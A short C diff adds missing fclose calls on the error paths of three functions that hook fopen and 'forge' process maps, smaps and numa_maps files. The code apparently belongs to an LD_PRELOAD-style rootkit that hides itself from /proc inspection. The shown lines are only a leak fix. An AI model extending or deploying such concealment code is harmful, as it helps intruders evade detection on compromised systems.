@@ -14,6 +14,7 @@ FILE *forge_maps(const char *pathname){
     hook(CFOPEN);
     if((pnt = call(CFOPEN, pathname, "r")) == NULL){
         errno = ENOENT;
+	fclose(o);
         return NULL;
     }
 
@@ -34,6 +35,7 @@ FILE *forge_smaps(const char *pathname){
     hook(CFOPEN);
     if((pnt = call(CFOPEN, pathname, "r")) == NULL){
         errno = ENOENT;
+	fclose(o);
         return NULL;
     }
 
@@ -56,6 +58,7 @@ FILE *forge_numamaps(const char *pathname){
     hook(CFOPEN);
     if((pnt = call(CFOPEN, pathname, "r")) == NULL){
         errno = ENOENT;
+	fclose(o);
         return NULL;
     }
 
